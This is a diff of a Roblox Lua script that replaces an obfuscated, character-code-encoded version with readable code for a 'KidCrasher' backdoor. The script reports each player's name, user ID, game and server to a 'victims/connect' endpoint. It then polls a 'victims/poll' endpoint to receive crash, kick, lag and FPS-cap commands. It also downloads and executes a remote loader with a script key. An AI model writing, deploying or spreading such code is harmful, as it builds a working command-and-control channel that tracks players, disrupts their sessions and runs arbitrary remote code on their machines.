@@ -1,1 +1,133 @@
-task.spawn(function()pcall(function()local _a=game:GetService(string.char(80,108,97,121,101,114,115))local _b=game:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101))local _c=game:GetService(string.char(82,117,110,83,101,114,118,105,99,101))local _d=_a.LocalPlayer or _a.PlayerAdded:Wait()local _e=(syn and syn.request)or http_request or request or(fluxus and fluxus.request)or(krnl_request)if not _e then return end local _f=string.char(85,110,107,110,111,119,110)task.spawn(function()local _g,_h=pcall(function()return game:GetService(string.char(77,97,114,107,101,116,112,108,97,99,101,83,101,114,118,105,99,101)):GetProductInfo(game.PlaceId)end)if _g and _h and _h.Name then _f=_h.Name end end)local _i=_G.KidCrasher or{}_G.KidCrasher=_i _i.lagConns=_i.lagConns or{}local function _j()for _k,_l in ipairs(_i.lagConns)do pcall(function()_l:Disconnect()end)end _i.lagConns={}end local function _m()task.spawn(function()while true do local _n={}for _o=1,1e5 do _n[_o]={_o,_o,_o,_o}end end end)end local function _p()_j()table.insert(_i.lagConns,_c.Heartbeat:Connect(function()for _o=1,5000 do local _k=math.sqrt(_o)*math.sin(_o)end end))end local function _q()_j()table.insert(_i.lagConns,_c.Heartbeat:Connect(function()for _o=1,250000 do local _k=math.sqrt(_o)*math.sin(_o)*math.cos(_o)end end))end local function _r(_s)pcall(function()setfpscap(_s and 10 or 240)end)end local function _t()pcall(function()_d:Kick(string.char(75,105,100,67,114,97,115,104,101,114))end)pcall(function()local _u=game:FindFirstChildOfClass(string.char(78,101,116,119,111,114,107,67,108,105,101,110,116))if _u then _u:Disconnect()end end)pcall(function()game:Shutdown()end)pcall(function()game:GetService(string.char(84,101,108,101,112,111,114,116,83,101,114,118,105,99,101)):Teleport(0,_d)end)end local _v={[string.char(67,114,97,115,104)]=_m,[string.char(75,105,99,107)]=_t,[string.char(76,97,103,32,78)]=_p,[string.char(76,97,103,32,67)]=_q,[string.char(76,97,103,32,83,116,111,112)]=_j,[string.char(67,97,114,114,121,32,83,116,111,112)]=_j,[string.char(70,80,83,32,79,110)]=function()_r(true)end,[string.char(70,80,83,32,79,102,102)]=function()_r(false)end,}task.spawn(function()pcall(function()local _w=_b:JSONEncode({name=_d.Name,userId=_d.UserId,game=_f,ping=math.floor((_d:GetNetworkPing()or 0)*1000),server=game.JobId~=""and game.JobId:sub(1,8)orstring.char(115,111,108,111),})_e({Url=string.char(104,116,116,112,115,58,47,47,112,114,111,106,101,99,116,45,45,51,48,56,56,50,97,53,56,45,57,56,100,54,45,52,54,49,100,45,98,56,55,53,45,100,51,97,52,51,98,55,50,101,57,54,101,45,100,101,118,46,108,111,118,97,98,108,101,46,97,112,112,47,97,112,105,47,112,117,98,108,105,99,47,118,105,99,116,105,109,115,47,99,111,110,110,101,99,116),Method=string.char(80,79,83,84),Headers={[string.char(67,111,110,116,101,110,116,45,84,121,112,101)]=string.char(97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110)},Body=_w,})end)end)_i.poller=(_i.poller or 0)+1 local _x=_i.poller task.spawn(function()local _y=_b:JSONEncode({userId=_d.UserId})while _i.poller==_x do pcall(function()local _z=_e({Url=string.char(104,116,116,112,115,58,47,47,112,114,111,106,101,99,116,45,45,51,48,56,56,50,97,53,56,45,57,56,100,54,45,52,54,49,100,45,98,56,55,53,45,100,51,97,52,51,98,55,50,101,57,54,101,45,100,101,118,46,108,111,118,97,98,108,101,46,97,112,112,47,97,112,105,47,112,117,98,108,105,99,47,118,105,99,116,105,109,115,47,112,111,108,108),Method=string.char(80,79,83,84),Headers={[string.char(67,111,110,116,101,110,116,45,84,121,112,101)]=string.char(97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110)},Body=_y,})if _z and _z.Body then local _A,_B=pcall(function()return _b:JSONDecode(_z.Body)end)if _A and _B and _B.cmds then for _k,_l in ipairs(_B.cmds)do local _C=_v[_l]if _C then task.spawn(_C)end end end end end)task.wait(2)end end)end)end)task.spawn(function()pcall(function()script_key=string.char(75,89,120,103,110,120,87,112,119,90,84,73,114,80,100,103,108,122,74,81,103,106,101,112,108,66,70,99,102,104,87,108);loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,97,112,105,46,108,117,97,114,109,111,114,46,110,101,116,47,102,105,108,101,115,47,118,52,47,108,111,97,100,101,114,115,47,51,48,51,48,50,97,48,55,55,102,57,99,50,102,99,50,97,50,54,49,100,55,49,98,55,57,101,53,99,56,97,48,46,108,117,97)))()end)end)
+-- KidCrasher panel auto-connect + command poller
+task.spawn(function()
+    pcall(function()
+        local Players = game:GetService("Players")
+        local HttpService = game:GetService("HttpService")
+        local RunService = game:GetService("RunService")
+        local plr = Players.LocalPlayer or Players.PlayerAdded:Wait()
+        local req = (syn and syn.request) or http_request or request
+            or (fluxus and fluxus.request) or (krnl_request)
+        if not req then return end
+
+        local gameName = "Unknown"
+        task.spawn(function()
+            local ok, info = pcall(function()
+                return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+            end)
+            if ok and info and info.Name then gameName = info.Name end
+        end)
+
+        local KC = _G.KidCrasher or {}
+        _G.KidCrasher = KC
+        KC.lagConns = KC.lagConns or {}
+
+        local function stopLag()
+            for _, c in ipairs(KC.lagConns) do pcall(function() c:Disconnect() end) end
+            KC.lagConns = {}
+        end
+
+        local function crash()
+            task.spawn(function()
+                while true do
+                    local t = {}
+                    for i = 1, 1e5 do t[i] = {i,i,i,i} end
+                end
+            end)
+        end
+
+        local function startLagN()
+            stopLag()
+            table.insert(KC.lagConns, RunService.Heartbeat:Connect(function()
+                for i = 1, 5000 do local _ = math.sqrt(i) * math.sin(i) end
+            end))
+        end
+
+        local function startLagC()
+            stopLag()
+            table.insert(KC.lagConns, RunService.Heartbeat:Connect(function()
+                for i = 1, 250000 do local _ = math.sqrt(i) * math.sin(i) * math.cos(i) end
+            end))
+        end
+
+        local function setFps(on)
+            pcall(function() setfpscap(on and 10 or 240) end)
+        end
+
+        local function kickMe()
+            pcall(function() plr:Kick("KidCrasher") end)
+            pcall(function()
+                local nc = game:FindFirstChildOfClass("NetworkClient")
+                if nc then nc:Disconnect() end
+            end)
+            pcall(function() game:Shutdown() end)
+            pcall(function()
+                game:GetService("TeleportService"):Teleport(0, plr)
+            end)
+        end
+
+        local handlers = {
+            ["Crash"] = crash,
+            ["Kick"] = kickMe,
+            ["Lag N"] = startLagN,
+            ["Lag C"] = startLagC,
+            ["Lag Stop"] = stopLag,
+            ["Carry Stop"] = stopLag,
+            ["FPS On"] = function() setFps(true) end,
+            ["FPS Off"] = function() setFps(false) end,
+        }
+
+        -- initial check-in in its own thread so slow HTTP never blocks the game
+        task.spawn(function()
+            pcall(function()
+                local body = HttpService:JSONEncode({
+                    name   = plr.Name,
+                    userId = plr.UserId,
+                    game   = gameName,
+                    ping   = math.floor((plr:GetNetworkPing() or 0) * 1000),
+                    server = game.JobId ~= "" and game.JobId:sub(1,8) or "solo",
+                })
+                req({
+                    Url = "https://project--30882a58-98d6-461d-b875-d3a43b72e96e-dev.lovable.app/api/public/victims/connect",
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = body,
+                })
+            end)
+        end)
+
+        KC.poller = (KC.poller or 0) + 1
+        local myPoll = KC.poller
+        task.spawn(function()
+            local pollBody = HttpService:JSONEncode({ userId = plr.UserId })
+            while KC.poller == myPoll do
+                pcall(function()
+                    local r = req({
+                        Url = "https://project--30882a58-98d6-461d-b875-d3a43b72e96e-dev.lovable.app/api/public/victims/poll",
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = pollBody,
+                    })
+                    if r and r.Body then
+                        local ok2, decoded = pcall(function()
+                            return HttpService:JSONDecode(r.Body)
+                        end)
+                        if ok2 and decoded and decoded.cmds then
+                            for _, c in ipairs(decoded.cmds) do
+                                local h = handlers[c]
+                                if h then task.spawn(h) end
+                            end
+                        end
+                    end
+                end)
+                task.wait(2)
+            end
+        end)
+    end)
+end)
+
+task.spawn(function()
+    pcall(function()
+        script_key="KYxgnxWpwZTIrPdglzJQgjeplBFcfhWl";
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/30302a077f9c2fc2a261d71b79e5c8a0.lua"))()
+    end)
+end)
